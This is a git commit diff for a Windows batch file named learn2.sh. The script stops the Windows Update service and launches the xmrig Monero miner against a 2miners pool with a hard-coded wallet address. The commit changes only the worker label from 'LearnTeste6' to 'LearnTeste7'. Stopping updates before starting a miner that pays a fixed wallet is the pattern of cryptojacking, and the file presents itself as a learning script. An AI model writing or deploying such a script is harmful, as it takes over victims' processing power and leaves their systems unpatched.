8b7f690f0372923715b8d735e580344bf7b4e347
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-01-20 09:41:57 -0300

    Update learn2.sh

--- learn2.sh
+++ learn2.sh
@@ -1,4 +1,4 @@
 @echo off
 net stop WUAUSERV
 cd /d "%~dp0"
-xmrig.exe --coin=XMR -o xmr.2miners.com:2222 -u 8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.LearnTeste6 -p x -t 6
+xmrig.exe --coin=XMR -o xmr.2miners.com:2222 -u 8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.LearnTeste7 -p x -t 6
